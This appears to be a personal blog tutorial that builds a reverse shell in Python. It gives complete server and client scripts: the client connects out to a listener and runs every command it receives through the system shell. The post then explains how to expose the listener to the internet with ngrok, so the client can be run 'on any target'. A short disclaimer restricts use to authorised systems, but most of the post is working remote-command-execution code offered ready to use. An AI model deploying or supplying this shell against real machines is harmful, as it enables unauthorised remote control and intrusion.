A reverse shell with Python
===========================

:status: draft
:date: 2021-02-19 20:15
:tags: security, linux, hacking, shell, sockets
:summary: I build a reverse shell with python and uses ngrok to make the server public

**Disclaimer**: The described methods should only be used for systems which you
have access rights. I used this method to get access to my mums PC, which I was
allowed. And yes, I'm 31, have my own family, but still help my mom with her PC.

.. image:: {static}/images/articels/security/reverse-shell-003.gif
  :width: 100 %
  :alt: alternate text

Some basics
-----------
What is a reverse shell? With a reverse shell, the target makes the connection.
On your client is run a server program, which listening for incoming
connections. And the target execute a program, which connect to your client.
Then you can run commands on the target from your client. My research:

  * `Acunetix <https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/>`_
  * `PythonCode <https://www.thepythoncode.com/article/create-reverse-shell-python>`_
  * `netsparker <https://www.netsparker.com/blog/web-security/understanding-reverse-shells/>`_

Python
------
We will write two small Python scripts one for the server and one for the
client. The only modules we use are
`sockets <https://docs.python.org/3/library/socket.html>`_ and the
`subprocess <https://docs.python.org/3/library/subprocess.html>`_. Make sure you
have read the documentation. The programs are short and self-explanatory,
nothing complicated just a little loop.


Server
~~~~~~

.. code-block:: python

  import socket

  HOST = '0.0.0.0'
  PORT = 5555

  # set up the socket so that it waits for an incoming connection
  s = socket.socket()
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((HOST, PORT))
  s.listen(1)
  print(f'[*] listening as {HOST}:{PORT}')

  # waiting for the target and sent a welcome message if it connected
  client_s, client_addr = s.accept()
  print(f'[*] client connected {client_addr}')
  client_s.send('welcome'.encode())

  # this loop will run, until you enter 'quit'
  while True:

      # 1. enter the command and send it to the target
      cmd = input('>>> ')
      client_s.send(cmd.encode())

      # check if you want to quit
      if cmd.lower() == 'quit':
          break

      # get the result of the command, executed on the target pc
      result = client_s.recv(1024).decode()
      print(result)

  client_s.close()
  s.close()


Client
~~~~~~

.. code-block:: python

  import socket
  import subprocess

  HOST = '0.0.0.0'
  PORT = 5555

  # set up the socket and connect to the server
  s = socket.socket()
  s.connect((HOST, PORT))

  # get the welcome message
  msg = s.recv(1024).decode()
  print('[*] server:', msg)

  # this loop will run until it receive 'quit'
  while True:

      # receive the command and print it
      cmd = s.recv(1024).decode()
      print(f'[*] receive {cmd}')

      # check if you want to quit
      if cmd.lower() == 'quit':
          break

      # now run the command and get the result.
      try:
          result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
      except Exception as e:
          result = str(e).encode()

      # if the command has no output, send 'ok' so the server knows everything is okay
      if len(result) == 0:
          result = 'OK'.encode()

      # send teh result to the server
      s.send(result)

  s.close()

How to run
----------
We only uses the Python Standard Library, so we don't have to install anything.
Simple execute

.. code-block:: shell

  python3 server.py

and

.. code-block:: shell

  python3 client.py

.. image:: {static}/images/articels/security/reverse-shell-001.gif
  :width: 100 %
  :alt: alternate text

The server run with *HOST=0.0.0.0* so that it listen on all incoming connection.
On some examples you read something like *HOST=localhost* or *HOST=127.0.0.1*.
But then it's only listen on connection from the *localhost*. You shouldn't
change the *HOST* of the server script. But if you run the client on another PC,
you have to enter the IP address of the server for the *HOST*. You get a problem
if the PC is not in your local network. Of course you can forward the port in
your router and then specify your public IP as *HOST*. But I want to show you
another way.

ngrok
-----
ngrok is a reverse proxy that creates a secure tunnel from a public endpoint to
a locally running web service. Simply put, with ngrok you can make any local
service public. And we will make our server public. Go to
`ngrok <https://ngrok.com>`_ sign up and follow the setup tutorial for your
system. For me it's

  1. download

     .. code-block:: shell

       wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip

  2. unzip

     .. code-block:: shell

       unzip ngrok-stable-linux-amd64.zip

  3. connect your account

     .. code-block:: shell

       ./ngrok authtoken 1WeW...

  4. exposed the server

     .. code-block:: shell

       ./ngrok tcp 5555

Now you are ready to run the client on any target, but you have to change the
*HOST* and *PORT* to the values from ngrok. For my example that will be

.. code-block:: python

  ...
  HOST = '4.tcp.ngrok.io'
  PORT = 12050
  ....

.. image:: {static}/images/articels/security/reverse-shell-002.png
  :width: 100 %
  :alt: alternate text

Conclusion
----------
As you can see, it's not that complicated to create your own reverse shell and
make it public. I know, there's a lot of space to improve this script. But for a
really Simple example they are quite good enough.
